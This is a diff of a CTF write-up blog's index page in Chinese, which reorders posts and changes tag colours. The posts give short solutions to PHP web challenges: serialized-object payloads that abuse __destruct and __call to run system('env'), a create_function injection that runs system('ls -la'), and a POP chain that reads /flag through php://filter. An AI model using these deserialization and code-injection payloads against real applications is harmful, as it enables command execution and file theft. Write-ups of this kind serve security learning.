@@ -181,8 +181,8 @@
         
 
 <div class="post">
-    <a href="/2026/02/10/2026-02-10-%E8%9C%9C%E9%9B%AA%E5%86%B0%E5%9F%8E%E5%90%89%E8%AD%A6%E5%BA%97/">
-        <h2 class="post-title">蜜雪冰城吉警店</h2>
+    <a href="/2026/02/10/2026-02-10-111/">
+        <h2 class="post-title">111</h2>
     </a>
     <div class="category-and-date">
         
@@ -198,8 +198,8 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p>这道题一开始猜测9号可能被隐藏了，没找到在哪。尝试直接触发9号，把8号的按钮id改为9，点击8号得到flag</p>
-<p><img src="/images/writeups/%E8%9C%9C%E9%9B%AA%E5%86%B0%E5%9F%8E%E5%90%89%E8%AD%A6%E5%BA%97_15f2c0a1.png" alt="蜜雪冰城吉警店_15f2c0a1"></p>
+            <p>这道题第一次输了一个1结果正好对了，后面又做了一次主要就是一直输中间值确认区间</p>
+<p><img src="/images/writeups/111_1e7e3b8c.png" alt="111_1e7e3b8c"></p>
 
             
         </div>
@@ -214,107 +214,11 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
         </span>
         
     </div>
-    <a href="/2026/02/10/2026-02-10-%E8%9C%9C%E9%9B%AA%E5%86%B0%E5%9F%8E%E5%90%89%E8%AD%A6%E5%BA%97/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2026/02/09/2026-02-09-ppppop/">
-        <h2 class="post-title">ppppop</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2026/2/9
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p><code>这道题打开一片空白查看源码也没发现内容查看网络发现cookie有点奇怪像被base64编码过，解码得到O:4:&quot;User&quot;:1:&#123;s:7:&quot;isAdmin&quot;;b:0;&#125;这里布尔类型的变量是0这里改成1看看能不能让网页正常显示，这里传一个参数给A用__destruct()给B利用B中的_call()执行命令构造payload：O:1:&quot;A&quot;:3:&#123;s:10:&quot;className&quot;;s:1:&quot;B&quot;;s:8:&quot;funcName&quot;;s:6:&quot;system&quot;;s:4:&quot;args&quot;;a:1:&#123;i:0;s:3:&quot;env&quot;;&#125;&#125;，这里反转加base64编码输入查看环境变量找到flag</code></p>
-<p>&#96;&#96;</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00a596">题解</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="color: #00bcd4">反序列化</a>
-        </span>
-        
-    </div>
-    <a href="/2026/02/09/2026-02-09-ppppop/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2026/02/09/2026-02-09-%E4%BA%86%E8%A7%A3%E8%BF%87PHP%E7%89%B9%E6%80%A7%E5%90%97/">
-        <h2 class="post-title">了解过PHP特性吗</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2026/2/9
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>根据题目构造payload：?num[]&#x3D;1&amp;114&#x3D;9e9         </p>
-<p>POST:514&#x3D;9999999999aaa&amp;ctype&#x3D;OZDCKNQ&amp;is_num&#x3D;807016042&amp;arr4y[]&#x3D;a</p>
-<p>然后题目让我们去Rc3_function.php</p>
-<p>这里create_function会创建一个函数前面是参数列表后面是代码构造payload</p>
-<p>nss&#x3D;}system(‘ls -la’);&#x2F;&#x2F;&amp;shell&#x3D;，这里}闭合create_function{，&#x2F;&#x2F;注释后面的}，输入得到flag</p>
-<p><img src="/images/writeups/%E4%BA%86%E8%A7%A3%E8%BF%87PHP%E7%89%B9%E6%80%A7%E5%90%97_a9794f54.png" alt="了解过PHP特性吗_a9794f54"></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00bcd4">题解</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/PHP/" style="color: #ff7d73">PHP</a>
-        </span>
-        
-    </div>
-    <a href="/2026/02/09/2026-02-09-%E4%BA%86%E8%A7%A3%E8%BF%87PHP%E7%89%B9%E6%80%A7%E5%90%97/" class="go-post">阅读全文</a>
+    <a href="/2026/02/10/2026-02-10-111/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -365,6 +269,102 @@
 </div>
 
 <div class="post">
+    <a href="/2026/02/09/2026-02-09-ppppop/">
+        <h2 class="post-title">ppppop</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/2/9
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p><code>这道题打开一片空白查看源码也没发现内容查看网络发现cookie有点奇怪像被base64编码过，解码得到O:4:&quot;User&quot;:1:&#123;s:7:&quot;isAdmin&quot;;b:0;&#125;这里布尔类型的变量是0这里改成1看看能不能让网页正常显示，这里传一个参数给A用__destruct()给B利用B中的_call()执行命令构造payload：O:1:&quot;A&quot;:3:&#123;s:10:&quot;className&quot;;s:1:&quot;B&quot;;s:8:&quot;funcName&quot;;s:6:&quot;system&quot;;s:4:&quot;args&quot;;a:1:&#123;i:0;s:3:&quot;env&quot;;&#125;&#125;，这里反转加base64编码输入查看环境变量找到flag</code></p>
+<p>&#96;&#96;</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="color: #03a9f4">反序列化</a>
+        </span>
+        
+    </div>
+    <a href="/2026/02/09/2026-02-09-ppppop/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2026/02/09/2026-02-09-%E4%BA%86%E8%A7%A3%E8%BF%87PHP%E7%89%B9%E6%80%A7%E5%90%97/">
+        <h2 class="post-title">了解过PHP特性吗</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/2/9
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>根据题目构造payload：?num[]&#x3D;1&amp;114&#x3D;9e9         </p>
+<p>POST:514&#x3D;9999999999aaa&amp;ctype&#x3D;OZDCKNQ&amp;is_num&#x3D;807016042&amp;arr4y[]&#x3D;a</p>
+<p>然后题目让我们去Rc3_function.php</p>
+<p>这里create_function会创建一个函数前面是参数列表后面是代码构造payload</p>
+<p>nss&#x3D;}system(‘ls -la’);&#x2F;&#x2F;&amp;shell&#x3D;，这里}闭合create_function{，&#x2F;&#x2F;注释后面的}，输入得到flag</p>
+<p><img src="/images/writeups/%E4%BA%86%E8%A7%A3%E8%BF%87PHP%E7%89%B9%E6%80%A7%E5%90%97_a9794f54.png" alt="了解过PHP特性吗_a9794f54"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/PHP/" style="color: #00bcd4">PHP</a>
+        </span>
+        
+    </div>
+    <a href="/2026/02/09/2026-02-09-%E4%BA%86%E8%A7%A3%E8%BF%87PHP%E7%89%B9%E6%80%A7%E5%90%97/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2026/02/08/2026-02-08-CV-Maker/">
         <h2 class="post-title">CV Maker</h2>
     </a>
@@ -399,7 +399,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
         </span>
         
     </div>
@@ -529,7 +529,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00bcd4">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
         </span>
         
     </div>
@@ -611,8 +611,8 @@ Payload：?N[S.S=system(env);在环境变量中找到flag
 </div>
 
 <div class="post">
-    <a href="/2026/02/08/2026-02-08-%E9%9B%AA%E5%B1%B1%E7%9A%84%E7%A7%98%E5%AF%86/">
-        <h2 class="post-title">雪山的秘密</h2>
+    <a href="/2026/02/08/2026-02-08-popchains/">
+        <h2 class="post-title">popchains</h2>
     </a>
     <div class="category-and-date">
         
@@ -628,9 +628,9 @@ Payload：?N[S.S=system(env);在环境变量中找到flag
     <div class="description">
         <div class="content" v-pre>
             
-            <p>附件是一段摩斯密码音频解码后得到</p>
-<p>3.2-..3-.23-.32-32.-3..-&#x2F;..2-223-.32-322-..3-..2-&#x2F;2.2-3..-232-223-..2-.32-&#x2F;3.2-..3-.23-3.3-..3-&#x2F;.32-32.-322-.3.-&#x2F;.3.-33.-22.-23.-..3-.23-..2-3..-&#x2F;.2.-..3-2.2-3..-.23-&#x2F;23.-.33-.32-2.2-3..-&#x2F;3.2-223-322-332-3..-233这里三进制转换再凯撒偏移14得到再根据flag的格式得到flag</p>
-<p>NSSCTF{FOR_THE_NATION_WE_CANT_FORGO_THIS_SKYBORNE_POWER_BUT_WE_FAILED}</p>
+            <p>这里得到flag的执行逻辑 触发__wakeup()-&gt;触发__toString()-&gt;触发__get()-&gt;触发__invoke()-&gt;include($value);构造payload：</p>
+<p>O:12:”Road_is_Long”:2:{s:4:”page”;r:1;s:6:”string”;O:13:”Make_a_Change”:1:{s:6:”effort”;O:13:”Try_Work_Hard”:1:{s:6:”var”;s:49:”php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag”;}}编码后输入得到flag的base64编码然后解码得到flag</p>
+<p><img src="/images/writeups/popchains_e3e0bee5.png" alt="popchains_e3e0bee5"></p>
 
             
         </div>
@@ -645,11 +645,16 @@ Payload：?N[S.S=system(env);在环境变量中找到flag
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00a596">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00bcd4">题解</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="color: #ff7d73">反序列化</a>
         </span>
         
     </div>
-    <a href="/2026/02/08/2026-02-08-%E9%9B%AA%E5%B1%B1%E7%9A%84%E7%A7%98%E5%AF%86/" class="go-post">阅读全文</a>
+    <a href="/2026/02/08/2026-02-08-popchains/" class="go-post">阅读全文</a>
 </div>
 
 
